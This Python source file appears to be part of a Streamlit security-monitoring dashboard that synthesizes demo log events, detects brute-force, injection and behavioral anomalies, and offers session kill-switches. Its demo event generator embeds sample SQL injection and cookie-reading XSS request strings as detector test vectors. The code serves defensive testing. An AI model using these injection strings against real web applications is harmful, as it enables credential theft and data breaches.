        roll = random.random()
        host, klass = random.choice(list(HOSTS.items()))
        user = random.choice(USERS)
        ip = random.choice(SRC_POOL)
        ts = time.time()
        if roll < 0.16:
            return {
                "ts": ts,
                "iso": _iso(ts),
                "event": "AUTH_FAIL",
                "user": user,
                "src_ip": ip,
                "host": host,
                "asset_class": klass,
                "vector": "DEMO_SYNTH", "msg": f"sshd: Failed password for {user} from {ip}",
            }
        if roll < 0.20:
            payloads = (
                "GET /login?user=admin' OR '1'='1 HTTP/1.1",
                "POST /q q=<script>document.cookie</script>",
                "GET /item?id=1 UNION SELECT username,password FROM users",
            )
            return {
                "ts": ts,
                "iso": _iso(ts),
                "event": "HTTP_REQ",
                "user": user,
                "src_ip": ip,
                "host": host,
                "asset_class": klass,
                "vector": "DEMO_SYNTH", "msg": random.choice(payloads),
            }
        if roll < 0.24:
            return {
                "ts": ts,
                "iso": _iso(ts),
                "event": "PHYSICAL_FAIL",
                "user": user,
                "src_ip": "0.0.0.0",
                "host": host,
                "asset_class": klass,
                "vector": "DEMO_SYNTH", "msg": f"badge-reader DENY for {user} at {host} cage-B after hours",
            }
        if roll < 0.55:
            return {
                "ts": ts,
                "iso": _iso(ts),
                "event": "AUTH_OK",
                "user": user,
                "src_ip": ip,
                "host": host,
                "asset_class": klass,
                "vector": "DEMO_SYNTH", "msg": f"sshd: Accepted publickey for {user} from {ip}",
            }
        return {
            "ts": ts,
            "iso": _iso(ts),
            "event": "NET_FLOW",
            "user": user,
            "src_ip": ip,
            "host": host,
            "asset_class": klass,
            "vector": "DEMO_SYNTH", "msg": f"allowed tcp {ip}:443 -> {host}:443 bytes={random.randint(200, 9000)}",
        }

    def _seed_if_empty(self) -> None:
        if self.log_path.exists() and self.log_path.stat().st_size > 0:
            return
        header = (
            "# Pak-CyberPulse SIEM stream — append-only JSONL. "
            "Lines starting with # are ignored. DEMO telemetry only.\n"
        )
        with self.write_lock:
            with open(self.log_path, "w", encoding="utf-8") as fh:
                fh.write(header)
        if not self.demo_mode:
            # LIVE default: never seed synthetic demo events. The stream
            # starts empty and fills from real sources only.
            return
        now = time.time()
        for i in range(12):
            ts = now - (12 - i) * 7
            host, klass = list(HOSTS.items())[i % len(HOSTS)]
            self.append_event(
                {
                    "ts": ts,
                    "iso": _iso(ts),
                    "event": "NET_FLOW",
                    "user": USERS[i % len(USERS)],
                    "src_ip": SRC_POOL[i % len(SRC_POOL)],
                    "host": host,
                    "asset_class": klass,
                    "msg": f"seed flow {i} allowed",
                    "vector": "SEED",
                }
            )


_ENGINE: Optional[SIEMEngine] = None
_ENGINE_LOCK = threading.Lock()


def get_siem_engine() -> SIEMEngine:
    global _ENGINE
    with _ENGINE_LOCK:
        if _ENGINE is None:
            _ENGINE = SIEMEngine()
        return _ENGINE


def _event_line(ev: dict[str, Any]) -> str:
    iso = str(ev.get("iso", ""))[11:19]
    etype = str(ev.get("event", "?")).ljust(13)
    ip = str(ev.get("src_ip", "-")).ljust(16)
    host = str(ev.get("host", "-")).ljust(16)
    user = str(ev.get("user", "-")).ljust(14)
    msg = str(ev.get("msg", ""))[:90]
    return f"{iso}  {etype}  {ip}  {host}  {user}  {msg}"


def _inject_audio_alert(message: str = "Alert: Server par brute-force attack chal raha hai, automated mitigation active.") -> None:
    """
    Inject an HTML5 audio + Web Speech API payload into the Streamlit viewport.
    Broadcasts a local vocalized security warning when a rule (e.g. PISF-05.2)
    transitions to Under Attack. Uses the browser's speechSynthesis so no
    external media file is required.
    """
    # Escape for safe embedding inside a JS string literal.
    safe = (
        message.replace("\\", "\\\\")
        .replace("'", "\\'")
        .replace('"', '\\"')
        .replace("\n", " ")
    )
    html = f"""
<script>
(function() {{
  try {{
    if (window.speechSynthesis) {{
      var u = new SpeechSynthesisUtterance('{safe}');
      u.lang = 'en-US';
      u.rate = 1.0;
      u.pitch = 1.05;
      window.speechSynthesis.cancel();
      window.speechSynthesis.speak(u);
    }}
  }} catch (e) {{ /* audio telemetry is best-effort */ }}
}})();
</script>
"""
    st.markdown(html, unsafe_allow_html=True)


def _soar_gate(permission: str) -> tuple[bool, str]:
    """
    RBAC gate for privileged SOC actions. Canonical logic lives in
    modules/rbac.py::gate_action — this is a thin alias so the SIEM panel
    and the SOAR panel stay consistent.
    """
    from modules.rbac import gate_action

    return gate_action(permission)


def render_siem_panel(engine: SIEMEngine) -> None:
    snap = engine.snapshot()
    db = get_db()

    # ---- Data provenance badge: LIVE real sources by default, DEMO only opt-in.
    from modules.log_ingest import (
        get_system_log_source,
        is_listener_running,
    )

    live_sources: list[str] = []
    no_source_reasons: list[str] = []
    _sys_src = get_system_log_source()
    if _sys_src is not None and _sys_src.running:
        live_sources.append(_sys_src.describe_short())
    elif _sys_src is not None and _sys_src.reason:
        no_source_reasons.append(f"system log: {_sys_src.reason}")
    else:
        no_source_reasons.append("system log source not started")
    if is_listener_running():
        live_sources.append("syslog listener 127.0.0.1:1514")
    else:
        no_source_reasons.append("syslog listener idle")
    demo_on = bool(snap.get("demo_mode"))

    if demo_on:
        _live_txt = ", ".join(live_sources) if live_sources else "none"
        st.markdown(
            f'<div class="cp-livebar demo"><span class="cp-live-dot red"></span>'
            f"DEMO MODE — synthetic telemetry (opt-in) · live sources: {_live_txt}</div>",
            unsafe_allow_html=True,
        )
    elif live_sources:
        st.markdown(
            f'<div class="cp-livebar"><span class="cp-live-dot"></span>'
            f"LIVE — {' · '.join(live_sources)}</div>",
            unsafe_allow_html=True,
        )
    else:
        st.markdown(
            '<div class="cp-livebar off">⚠ NO LIVE LOG SOURCES AVAILABLE — '
            + "; ".join(no_source_reasons)
            + ". Fix: Technical Safeguards → Log Ingest → start the syslog listener "
            "or the system log source. Nothing is synthesized.</div>",
            unsafe_allow_html=True,
        )

    _demo_toggle = st.toggle(
        "🎭 DEMO mode — synthesize demo telemetry (strictly opt-in)",
        value=demo_on,
        key="cp_demo_mode",
        help="When OFF (default) the dashboard shows ONLY live events from real "
             "sources. Turn ON to generate clearly-labelled DEMO_SYNTH traffic.",
    )
    if _demo_toggle != demo_on:
        engine.set_demo_mode(_demo_toggle)
        st.session_state["_siem_notice"] = (
            "DEMO mode ON — synthetic telemetry will be generated and labelled DEMO_SYNTH."
            if _demo_toggle
            else "DEMO mode OFF — showing live sources only."
        )
        st.rerun()

    # ---- SOC status bar: one-glance operational picture
    n_attacks = len(snap.get("attacks") or [])
    n_anom = len(snap.get("anomalies") or [])
    tailer_ok = bool(snap.get("thread_alive"))
    if n_attacks > 0:
        st.markdown(
            '<div class="cp-banner cp-critical"><span class="cp-live-dot red"></span>SOC STATUS: UNDER ATTACK — '
            f"{n_attacks} active brute-force incident(s). Automated containment armed.</div>",
            unsafe_allow_html=True,
        )
        st.markdown(
            '<div class="cp-analyzing red"><span class="cp-scanring red"></span>THREAT ANALYSIS RUNNING</div>',
            unsafe_allow_html=True,
        )
        for atk in (snap.get("attacks") or [])[:3]:
            st.markdown(
                f'<div class="cp-threat-card"><span class="cp-live-dot red"></span>'
                f'<div><div class="cp-threat-id">⚠ THREAT DETECTED — {atk.get("src_ip", "?")} / {atk.get("user", "?")}</div>'
                f'<div class="cp-threat-sub">{atk.get("rule", "")[:110]} · {atk.get("count", "?")} events in {atk.get("window_s", "?")}s</div></div></div>',
                unsafe_allow_html=True,
            )
    elif n_anom > 0:
        st.markdown(
            '<div class="cp-banner cp-action"><span class="cp-live-dot"></span>SOC STATUS: ELEVATED — '
            f"{n_anom} behavioral anomalie(s) under review (PISF-05.3).</div>",
            unsafe_allow_html=True,
        )
        st.markdown(
            '<div class="cp-analyzing"><span class="cp-scanring"></span>ANALYZING LIVE STREAM</div>',
            unsafe_allow_html=True,
        )
    elif tailer_ok:
        st.markdown(
            '<div class="cp-banner cp-hardened"><span class="cp-live-dot"></span>SOC STATUS: NOMINAL — tailer live, all windows clear.</div>',
            unsafe_allow_html=True,
        )
        st.markdown(
            '<div class="cp-analyzing"><span class="cp-scanring"></span>ANALYZING LIVE STREAM</div>',
            unsafe_allow_html=True,
        )
    else:
        st.markdown(
            '<div class="cp-banner cp-action">⚫ SOC STATUS: DEGRADED — tailer thread is down.</div>',
            unsafe_allow_html=True,
        )

    c1, c2, c3, c4, c5 = st.columns(5)
    c1.metric("Events ingested", f"{snap['lines_ingested']}")
    c2.metric("Hot IAM windows", f"{len(snap['window_keys'])}")
    c3.metric("Injection hits", f"{len(snap['injections'])}")
    c4.metric("Behavioral anomalies", f"{n_anom}")
    c5.metric("Tailer thread", "ALIVE" if tailer_ok else "DOWN")

    st.caption(
        f"Sliding-window rule PISF-05.2 — {FAIL_THRESHOLD} failed logins for one "
        f"Source IP / User inside {WINDOW_SECONDS} seconds. Correlation uses a "
        "per-tuple deque; records older than the window are evicted on every push."
    )

    b1, b2, b3, b4 = st.columns(4)
    with b1:
        if st.button("Inject brute-force test vector (10 AUTH_FAIL / same IP+user)", use_container_width=True):
            info = engine.fire_bruteforce_burst()
            st.session_state["_siem_notice"] = (
                f"Wrote {info['count']} AUTH_FAIL events for {info['user']}@{info['src_ip']} "
                f"targeting {info['host']}. Window will trip once the tailer consumes them."
            )
    with b2:
        if st.button("Inject SQLi/XSS test vector", use_container_width=True):
            engine.fire_injection_sample()
            st.session_state["_siem_notice"] = "Wrote one HTTP_REQ containing SQLi and XSS signatures."
    with b3:
        if st.button("Inject anomaly test vector (03:00 login, new IP)", use_container_width=True):
            info = engine.fire_anomaly_vector()
            st.session_state["_siem_notice"] = (
                f"Trained baseline for {info['user']} (12 morning logins from {info['baseline_ip']}), "
                f"then wrote a 03:00 UTC login from new IP {info['anomaly_ip']}. "
                "PISF-05.3 should flag NEW_IP + OFF_HOURS."
            )
    with b4:
        st.caption("Test vectors are labelled DEMO_* in the JSONL payload.")

    st.markdown("**Advanced attack vectors** (OWASP Top 10 pattern library)")
    v1, v2, v3, v4 = st.columns(4)
    with v1:
        if st.button("Signature suite: CMDi/SSRF/Log4Shell/SSTI/LFI/…", use_container_width=True):
            info = engine.fire_signature_vectors()
            st.session_state["_siem_notice"] = (
                f"Wrote {info['count']} malicious HTTP requests from {info['src_ip']} "
                "(CMDi, SSRF, Log4Shell, SSTI, LFI, misconfig, deserial, secret-in-URL, BAC)."
            )
    with v2:
        if st.button("Password spraying (1 IP → 8 users)", use_container_width=True):
            info = engine.fire_spray_vector()
            st.session_state["_siem_notice"] = (
                f"Wrote {info['fails']} AUTH_FAIL from {info['src_ip']} across {info['users']} users. "
                "PASSWORD_SPRAY should fire (evades per-user windows)."
            )
    with v3:
        if st.button("Impossible travel (PK → US, 5 min) — heuristic, no GeoIP", use_container_width=True):
            info = engine.fire_travel_vector()
            st.session_state["_siem_notice"] = (
                f"Wrote two logins for {info['user']} from distant networks 5 min apart. "
                "IMPOSSIBLE_TRAVEL heuristic should fire (heuristic — /16 network change within 15 min, no GeoIP)."
            )
    with v4:
        if st.button("Data exfiltration burst (25 /export)", use_container_width=True):
            info = engine.fire_exfil_vector()
            st.session_state["_siem_notice"] = (
                f"Wrote {info['hits']} /export hits from {info['src_ip']}. "
                "EXFILTRATION behavior should fire."
            )

    if st.session_state.get("_siem_notice"):
        st.info(st.session_state["_siem_notice"])

    # ---- Audio telemetry when any control is Under Attack (PISF-05.2 etc.)
    under_attack_count = 0
    try:
        readiness = db.compute_readiness()
        under_attack_count = int(readiness.get("under_attack", 0))
    except Exception:
        under_attack_count = len(snap.get("attacks") or [])
    if under_attack_count > 0 or snap.get("attacks"):
        # Fire vocalized warning once per session transition to avoid spam.
        alert_key = f"_audio_alerted_{under_attack_count}"
        if not st.session_state.get(alert_key):
            _inject_audio_alert(
                "Alert: Server par brute-force attack chal raha hai, automated mitigation active."
            )
            st.session_state[alert_key] = True
            # Also ensure air-gapped backup has been attempted.
            try:
                from modules.soar_engine import maybe_trigger_airgap_on_attack
                maybe_trigger_airgap_on_attack()
            except Exception:
                pass

    if snap["attacks"]:
        st.markdown(
            '<div class="cp-banner cp-critical">CRITICAL INFRACTION — IAM sliding-window threshold breached. '
            "PISF-05 sub-controls marked Under Attack. Open the SOAR gate to contain.</div>",
            unsafe_allow_html=True,
        )
        st.dataframe(snap["attacks"], use_container_width=True, hide_index=True)
    else:
        st.markdown(
            '<div class="cp-banner cp-hardened">IAM window clear — no (IP, user) pair currently holds '
            f"{FAIL_THRESHOLD}+ failures inside {WINDOW_SECONDS}s.</div>",
            unsafe_allow_html=True,
        )

    # ------------------------------------------------------------------
    # PISF-05.3 behavioral anomaly (UEBA-lite) findings
    # ------------------------------------------------------------------
    st.subheader("Behavioral anomalies — PISF-05.3 (UEBA-lite)")
    st.caption(
        "Per-user baselines learned from AUTH_OK events: known source IPs and "
        "normal login hours. NEW_IP = first-ever IP for the user; OFF_HOURS = "
        "login at an hour holding <10% of that user's logins."
    )
    anomalies = snap.get("anomalies") or []
    if anomalies:
        rows = [
            {
                "time": a.get("iso", "")[11:19],
                "kind": a.get("kind"),
                "user": a.get("user"),
                "src_ip": a.get("src_ip"),
                "detail": str(a.get("detail", ""))[:110],
            }
            for a in reversed(anomalies[-20:])
        ]
        st.dataframe(rows, use_container_width=True, hide_index=True)
    else:
        st.write("No behavioral anomalies — all logins match learned user baselines.")

    # ------------------------------------------------------------------
    # Threat Pattern Library — OWASP Top 10 x PISF, signature + behavioral
    # ------------------------------------------------------------------
    st.subheader("Threat Pattern Library — OWASP Top 10 × PISF")
    st.caption(
        "Every attack the engine understands, as data. Signature patterns match "
        "log lines with regex; behavioral patterns correlate events over time. "
        "Each carries its automatic SOAR mitigation playbook."
    )
    from modules.attack_patterns import PATTERNS as _PATS, owasp_coverage as _owasp_cov
    cov = _owasp_cov()
    st.caption(
        f"OWASP coverage: {len(cov)}/10 categories · "
        f"{len(_PATS)} patterns ({sum(1 for p in _PATS if p['kind']=='signature')} signature, "
        f"{sum(1 for p in _PATS if p['kind']=='behavioral')} behavioral)"
    )
    sev_class = {"Critical": "sev-critical", "High": "sev-high", "Medium": "sev-medium"}
    for p in _PATS:
        steps = "".join(f"<li>{s}</li>" for s in p["mitigation"])
        st.markdown(
            f'<details class="pat-card"><summary>'
            f'<span class="sev {sev_class.get(p["severity"], "sev-medium")}">{p["severity"]}</span> '
            f'{p["id"]} — {p["name"]} '
            f'<span class="pat-meta">[{p["kind"]}]</span></summary>'
            f'<div class="pat-meta">{p["owasp"]} · {p["pisf"]}</div>'
            f'<div style="font-size:0.87rem;margin:6px 0;">{p["description"]}</div>'
            f'<div style="font-size:0.82rem;color:var(--fg-muted);">Indicators: {", ".join(p["indicators"][:3])}</div>'
            f'<div style="font-weight:600;font-size:0.85rem;margin-top:8px;">🛡 Auto-mitigation playbook</div>'
            f'<ol class="pat-playbook">{steps}</ol>'
            f'</details>',
            unsafe_allow_html=True,
        )

    st.subheader("Live threat-pattern hits + mitigations")
    phits = snap.get("patterns") or []
    if phits:
        prows = []
        for h in reversed(phits[-25:]):
            ah = annotate_alert(h)  # MITRE ATT&CK technique + tactics per hit
            mitre = ""
            if ah.get("mitre_technique_id"):
                tactics = ", ".join(ah.get("mitre_tactics", []))
                mitre = f"{ah['mitre_technique_id']} · {ah['mitre_technique']} ({tactics})"
            prows.append(
                {
                    "time": h.get("iso", "")[11:19],
                    "pattern": h.get("pattern_id"),
                    "mitre": mitre,
                    "severity": h.get("severity"),
                    "src_ip": h.get("src_ip"),
                    "matched": str(h.get("matched", ""))[:60],
                    "mitigation": "; ".join(h.get("mitigation", [])[:2]),
                }
            )
        st.dataframe(prows, use_container_width=True, hide_index=True)
    else:
        st.write("No threat-pattern hits — fire a vector above to see detection + auto-mitigation.")

    # ------------------------------------------------------------------
    # Zero-Trust Active Session Manager (registry-backed, v3)
    # ------------------------------------------------------------------
    st.subheader("Zero-Trust Active Session Manager")
    st.caption(
        "Sessions are persisted in the SQLite session registry "
        "(zt_sessions table). Live traffic upserts them as active; the "
        "kill-switch revokes them, and revoked rows STAY visible as revoked — "
        "a kill no longer vanishes when the session list rebuilds."
    )
    from modules.session_registry import SessionRegistry

    registry = SessionRegistry(db)
    # Upsert every distinct live source IP seen in recent events/attacks.
    live_ips: dict[str, dict[str, str]] = {}
    for ev in snap.get("recent") or []:
        ip = str(ev.get("src_ip") or "").strip()
        if not ip or ip in {"0.0.0.0", "-", "unknown"}:
            continue
        if ip not in live_ips:
            live_ips[ip] = {
                "src_ip": ip,
                "user": str(ev.get("user", "-")),
                "host": str(ev.get("host", "-")),
            }
        else:
            live_ips[ip]["user"] = str(ev.get("user", live_ips[ip]["user"]))
            live_ips[ip]["host"] = str(ev.get("host", live_ips[ip]["host"]))
    for atk in snap.get("attacks") or []:
        ip = str(atk.get("src_ip") or "").strip()
        if ip and ip not in live_ips:
            live_ips[ip] = {
                "src_ip": ip,
                "user": str(atk.get("user", "-")),
                "host": str(atk.get("host", "-")),
            }
    for row in live_ips.values():
        registry.upsert_active(row["src_ip"], row["user"], row["host"])
    sessions = registry.list_sessions()

    kill_allowed, kill_banner = _soar_gate("soar.kill_session")
    if kill_banner:
        st.markdown(kill_banner, unsafe_allow_html=True)

    if not sessions:
        st.write("No sessions in the registry yet — waiting for telemetry.")
    else:
        st.dataframe(
            [
                {
                    "src_ip": s["src_ip"],
                    "user": s["user"],
                    "host": s["host"],
                    "status": s["status"],
                    "revoked_at": s["revoked_at"] or "—",
                    "revoked_by": s["revoked_by"] or "—",
                    "last_seen": s["last_seen"],
                }
                for s in sessions
            ],
            use_container_width=True,
            hide_index=True,
        )
        st.write("Per-host kill-switch:")
        cols = st.columns(min(4, max(1, len(sessions))))
        for idx, s in enumerate(sessions):
            col = cols[idx % len(cols)]
            with col:
                label = f"🚫 Kill Session & Ban Host\n{s['src_ip']}"
                if st.button(
                    label,
                    key=f"zt_kill_{s['src_ip']}",
                    use_container_width=True,
                    disabled=not kill_allowed,
                ):
                    try:
                        from modules.soar_engine import terminate_and_ban_session

                        result = terminate_and_ban_session(s["src_ip"])
                        st.session_state["_zt_last"] = {
                            "ip": s["src_ip"],
                            "mode": result.mode,
                            "ok": result.ok,
                            "detail": result.detail,
                        }
                        # Mark related control Non-Compliant until re-assessed.
                        db.update_control_status(
                            "PISF-05.1",
                            STATUS_UNDER_ATTACK if not result.ok else STATUS_UNDER_ATTACK,
                            f"Zero-Trust kill issued for {s['src_ip']} mode={result.mode}",
                        )
                        st.rerun()
                    except Exception as exc:  # noqa: BLE001
                        st.error(f"Kill-switch failed: {exc}")
        if st.session_state.get("_zt_last"):
            import html as _html
            last = st.session_state["_zt_last"]
            _ip = _html.escape(str(last.get("ip")))
            _mode = _html.escape(str(last.get("mode")))
            _detail = _html.escape(str(last.get("detail", ""))[:240])
            if last.get("ok"):
                st.markdown(
                    f'<div class="cp-blocked">'
                    f'<svg class="cp-check" viewBox="0 0 52 52"><circle class="cp-check-circle" cx="26" cy="26" r="24"/>'
                    f'<path class="cp-check-mark" d="M14 27l8 8 16-17"/></svg>'
                    f'<div class="cp-blocked-title">⛔ SESSION TERMINATED &amp; HOST BANNED — {_ip}</div>'
                    f'<div class="cp-blocked-sub">{_mode} — {_detail}</div></div>',
                    unsafe_allow_html=True,
                )
            else:
                st.markdown(
                    f'<div class="cp-banner cp-action">Zero-Trust action on {_ip}: '
                    f'{_mode} — {_detail}</div>',
                    unsafe_allow_html=True,
                )

    left, right = st.columns((3, 2), gap="large")
    with left:
        st.subheader("Live SIEM stream")
        st.markdown(
            '<div class="cp-scanline"><span class="cp-scanring"></span>SCANNING LIVE STREAM</div>',
            unsafe_allow_html=True,
        )
        lines = [_event_line(e) for e in reversed(snap["recent"][-60:])]
        body = "\n".join(lines) if lines else "awaiting telemetry…"
        st.code(body, language="text")
        st.caption(f"Append-only file: {engine.log_path.name}  ·  last error: {snap['last_error'] or 'none'}")
    with right:
        st.subheader("Sliding-window occupancy")
        if snap["window_keys"]:
            rows = [
                {"tuple": k, "fails_in_60s": v, "trips_at": FAIL_THRESHOLD}
                for k, v in sorted(snap["window_keys"].items(), key=lambda kv: -kv[1])
            ]
            st.dataframe(rows, use_container_width=True, hide_index=True)
        else:
            st.write("No live AUTH_FAIL tuples in the current 60-second window.")

        st.subheader("PISF-04 / PISF-10 injection buffer")
        if snap["injections"]:
            inj_lines = [
                f"{i.get('iso','')[11:19]}  {','.join(i.get('signatures', []))}  "
                f"{i.get('src_ip')}  {i.get('msg','')[:70]}"
                for i in reversed(snap["injections"][-12:])
            ]
            st.code("\n".join(inj_lines), language="text")
        else:
            st.write("No application-layer manipulation signatures in buffer.")

        st.subheader("PISF-08 physical access")
        if snap["physical"]:
            phy = [
                f"{p.get('iso','')[11:19]}  {p.get('host')}  {p.get('msg','')[:70]}"
                for p in reversed(snap["physical"][-8:])
            ]
            st.code("\n".join(phy), language="text")
        else:
            st.write("No failed-badge events in buffer.")

    with st.expander("CII asset register (PISF-13 / PISF-02)"):
        st.dataframe(db.fetch_assets(), use_container_width=True, hide_index=True)
